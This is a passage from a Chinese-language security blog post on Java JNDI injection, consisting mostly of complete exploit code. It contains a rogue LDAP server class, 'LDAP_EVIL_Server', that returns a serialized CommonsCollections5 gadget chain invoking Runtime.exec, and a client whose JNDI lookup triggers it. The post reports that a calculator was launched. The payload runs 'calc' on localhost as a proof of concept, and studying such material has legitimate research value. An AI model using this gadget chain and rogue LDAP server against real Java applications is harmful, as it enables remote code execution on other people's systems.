</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">JNDI</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServerConfig</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.InMemoryListenerConfig</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.sdk.Entry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.sdk.LDAPResult</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.sdk.ResultCode</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.management.BadAttributeValueExpException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.net.ServerSocketFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.net.SocketFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.net.ssl.SSLSocketFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ByteArrayOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.InetAddress</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.URL</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">LDAP_EVIL_Server</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">LDAP_BASE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;dc=example,dc=com&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">tmp_args</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;http://127.0.0.1:8081/#test&#34;</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">4444</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InMemoryDirectoryServerConfig</span><span class="w"> </span><span class="n">config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InMemoryDirectoryServerConfig</span><span class="p">(</span><span class="n">LDAP_BASE</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">config</span><span class="p">.</span><span class="na">setListenerConfigs</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InMemoryListenerConfig</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;listen&#34;</span><span class="p">,</span><span class="w"> </span><span class="c1">//$NON-NLS-1$</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">InetAddress</span><span class="p">.</span><span class="na">getByName</span><span class="p">(</span><span class="s">&#34;0.0.0.0&#34;</span><span class="p">),</span><span class="w"> </span><span class="c1">//$NON-NLS-1$</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">port</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ServerSocketFactory</span><span class="p">.</span><span class="na">getDefault</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">SocketFactory</span><span class="p">.</span><span class="na">getDefault</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">(</span><span class="n">SSLSocketFactory</span><span class="p">)</span><span class="w"> </span><span class="n">SSLSocketFactory</span><span class="p">.</span><span class="na">getDefault</span><span class="p">()));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">config</span><span class="p">.</span><span class="na">addInMemoryOperationInterceptor</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">OperationInterceptor</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="n">args</span><span class="o">[</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="o">]</span><span class="p">)));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InMemoryDirectoryServer</span><span class="w"> </span><span class="n">ds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InMemoryDirectoryServer</span><span class="p">(</span><span class="n">config</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Listening on 0.0.0.0:&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">port</span><span class="p">);</span><span class="w"> </span><span class="c1">//$NON-NLS-1$</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ds</span><span class="p">.</span><span class="na">startListening</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">class</span> <span class="nc">OperationInterceptor</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">InMemoryOperationInterceptor</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">private</span><span class="w"> </span><span class="n">URL</span><span class="w"> </span><span class="n">codebase</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="nf">OperationInterceptor</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">URL</span><span class="w"> </span><span class="n">cb</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cb</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">processSearchResult</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">InMemoryInterceptedSearchResult</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">base</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">result</span><span class="p">.</span><span class="na">getRequest</span><span class="p">().</span><span class="na">getBaseDN</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Entry</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Entry</span><span class="p">(</span><span class="n">base</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">sendResult</span><span class="p">(</span><span class="n">result</span><span class="p">,</span><span class="w"> </span><span class="n">base</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="n">e1</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">e1</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">sendResult</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">InMemoryInterceptedSearchResult</span><span class="w"> </span><span class="n">result</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">base</span><span class="p">,</span><span class="w"> </span><span class="n">Entry</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">URL</span><span class="w"> </span><span class="n">turl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="p">.</span><span class="na">getRef</span><span class="p">().</span><span class="na">replace</span><span class="p">(</span><span class="sc">&#39;.&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;/&#39;</span><span class="p">).</span><span class="na">concat</span><span class="p">(</span><span class="s">&#34;.class&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Send LDAP reference result for &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">base</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; redirecting to &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">turl</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;javaClassName&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;foo&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cbstring</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">refPos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cbstring</span><span class="p">.</span><span class="na">indexOf</span><span class="p">(</span><span class="sc">&#39;#&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">refPos</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">cbstring</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cbstring</span><span class="p">.</span><span class="na">substring</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">refPos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;javaSerializedData&#34;</span><span class="p">,</span><span class="n">CommonsCollections5</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="p">.</span><span class="na">sendSearchEntry</span><span class="p">(</span><span class="n">e</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="p">.</span><span class="na">setResult</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">LDAPResult</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">ResultCode</span><span class="p">.</span><span class="na">SUCCESS</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">CommonsCollections5</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{}}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{}}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chainedTransformer</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">map</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">lazyMap</span><span class="o">=</span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="n">chainedTransformer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TiedMapEntry</span><span class="w"> </span><span class="n">tiedMapEntry</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">TiedMapEntry</span><span class="p">(</span><span class="n">lazyMap</span><span class="p">,</span><span class="s">&#34;test&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BadAttributeValueExpException</span><span class="w"> </span><span class="n">badAttributeValueExpException</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">BadAttributeValueExpException</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="o">=</span><span class="n">badAttributeValueExpException</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;val&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">badAttributeValueExpException</span><span class="p">,</span><span class="n">tiedMapEntry</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">byteArrayOutputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">objectOutputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">byteArrayOutputStream</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">objectOutputStream</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">badAttributeValueExpException</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">objectOutputStream</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">byteArrayOutputStream</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>客户端代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">JNDI</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.InitialContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">LDAP_Client</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">object</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">().</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;ldap://127.0.0.1:4444/dc=example,dc=com&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>成功弹出计算机。</p>
<p>参考文章：</p>
<p><code>https://nivi4.notion.site/Java-JNDI-ddd6c46c271545598180799ab255e09a</code></p>
<p><code>https://www.javasec.org/javase/JNDI/</code></p>
<p><code>https://www.cnblogs.com/nice0e3/p/13958047.html#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0</code></p>
<p><code>https://baicany.github.io/2023/08/19/jndi/#%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E9%99%90%E5%88%B6%EF%BC%9A%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0Class%E4%BD%9C%E4%B8%BAReference-Factory</code></p>

</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">相关文章</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/apache-tomcat-partial-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
        
        

        <div class="article-details">
            <h2 class="article-title">Apache Tomcat partial PUT文件上传反序列化漏洞</h2>
        </div>
    </a>
</article>

            
                
<article class="">
